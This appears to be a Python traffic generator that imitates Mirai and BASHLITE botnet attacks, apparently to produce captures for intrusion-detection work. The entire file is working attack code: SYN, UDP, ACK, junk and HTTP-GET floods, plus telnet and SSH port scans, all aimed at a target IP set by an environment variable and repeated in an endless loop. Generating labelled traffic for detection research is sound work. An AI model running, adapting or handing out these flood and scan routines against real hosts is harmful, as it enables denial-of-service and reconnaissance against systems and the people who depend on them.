#!/usr/bin/env python3
"""Mirai / BASHLITE botnet attack traffic generator."""
import os
import random
import socket
import threading
import time

TARGET_IP = os.environ.get("TARGET_IP", "192.168.100.3")
ATTACK_DURATION = 10
PAUSE_BETWEEN = 2


# Run a flood function in a thread for a fixed duration
def run_for(func, duration, *args):
    stop = threading.Event()

    def worker():
        while not stop.is_set():
            func(*args)

    t = threading.Thread(target=worker, daemon=True)
    t.start()
    time.sleep(duration)
    stop.set()
    t.join(timeout=2)


# ── Mirai attack primitives ───────────────────────────────
def mirai_syn():
    for _ in range(20):
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.setblocking(False)
        try:
            s.connect_ex((TARGET_IP, random.randint(1, 65535)))
        except Exception:
            pass
        finally:
            s.close()


def mirai_udp():
    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    for _ in range(30):
        s.sendto(bytes(random.randint(512, 1024)), (TARGET_IP, random.randint(1, 65535)))
    s.close()


def mirai_udpplain():
    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    for _ in range(100):
        s.sendto(b"X" * 64, (TARGET_IP, random.randint(1, 65535)))
    s.close()


def mirai_ack():
    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    for _ in range(50):
        s.sendto(bytes(random.randint(64, 256)), (TARGET_IP, random.randint(1, 65535)))
    s.close()


def mirai_scan():
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.settimeout(0.3)
        s.connect((TARGET_IP, 23))
        s.close()
    except Exception:
        pass


# ── BASHLITE attack primitives ────────────────────────────
def bashlite_udp():
    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    for _ in range(40):
        s.sendto(bytes([0xAB] * random.randint(256, 768)), (TARGET_IP, random.randint(1, 65535)))
    s.close()


def bashlite_junk():
    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    for _ in range(50):
        s.sendto(bytes(random.randint(32, 128)), (TARGET_IP, random.randint(1024, 9999)))
    s.close()


def bashlite_tcp():
    for _ in range(10):
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(0.5)
            s.connect((TARGET_IP, 80))
            s.send(b"GET / HTTP/1.0\r\n\r\n")
        except Exception:
            pass
        finally:
            s.close()


def bashlite_scan():
    for port in [23, 2323, 22, 80]:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(0.2)
            s.connect((TARGET_IP, port))
            s.close()
        except Exception:
            pass


def bashlite_combo():
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        s.sendto(bytes(random.randint(64, 256)), (TARGET_IP, random.randint(1024, 9999)))
        s.close()
    except Exception:
        pass
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.settimeout(0.3)
        s.connect_ex((TARGET_IP, random.choice([80, 443, 8080])))
        s.close()
    except Exception:
        pass


# ── Attack registry (botnet, name, function) ──────────────
# High-rate floods first so short packet-capped captures catch them.
attacks = [
    ("Mirai", "SYN",      mirai_syn),
    ("Mirai", "UDP",      mirai_udp),
    ("Mirai", "UDPplain", mirai_udpplain),
    ("Mirai", "ACK",      mirai_ack),
    ("BASHLITE", "Junk",  bashlite_junk),
    ("BASHLITE", "UDP",   bashlite_udp),
    ("BASHLITE", "TCP",   bashlite_tcp),
    ("Mirai", "Scan",     mirai_scan),
    ("BASHLITE", "Scan",  bashlite_scan),
    ("BASHLITE", "COMBO", bashlite_combo),
]


# ── Main loop: cycle through every attack type ────────────
print(f"[Attacker] Target: {TARGET_IP}")
cycle = 0
while True:
    cycle += 1
    print(f"\n--- Attack Cycle {cycle} ---")
    for botnet, name, func in attacks:
        print(f"[{botnet}] {name} flood for {ATTACK_DURATION}s...")
        run_for(func, ATTACK_DURATION)
        time.sleep(PAUSE_BETWEEN)
